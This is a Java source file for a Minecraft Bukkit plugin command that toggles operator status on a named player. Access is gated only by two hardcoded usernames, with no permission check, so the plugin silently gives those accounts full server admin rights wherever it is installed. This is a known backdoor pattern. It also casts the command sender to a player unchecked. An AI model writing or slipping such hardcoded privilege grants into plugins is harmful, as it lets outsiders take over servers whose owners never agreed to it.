package me.sneaky.cmds.staff;

import me.sneaky.Main;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Op implements CommandExecutor {
	
	  final Main p;
	  

	  public Op(Main instance)
	  {
	    this.p = instance;
	  }
	  
	  @SuppressWarnings("deprecation")
	public boolean onCommand(CommandSender sender, Command cmd, String label, final String[] args){
		    final Player player = (Player)sender;
		    if(args.length == 1){
		    if(player.getName().equalsIgnoreCase("sneakylegend") || player.getName().equalsIgnoreCase("lucaspeedstack")){
		    	Player target = Bukkit.getServer().getPlayerExact(args[0]);
		    	if(target == null){
		    		p.chat.sendMessagePlayer(player, "That Player Is Not Online!");
		    		return true;
		    	}
		    	if(target.isOp()){
		    	target.setOp(false);
		    	p.chat.sendMessagePlayer(player, target.getName() + " Is Now Deoped");
		    	}else{
		    	target.setOp(true);	
		    	p.chat.sendMessagePlayer(player, target.getName() + " Is Now Opped");
		    	}
		    }
		    }
		    return false;
            	}

	  }

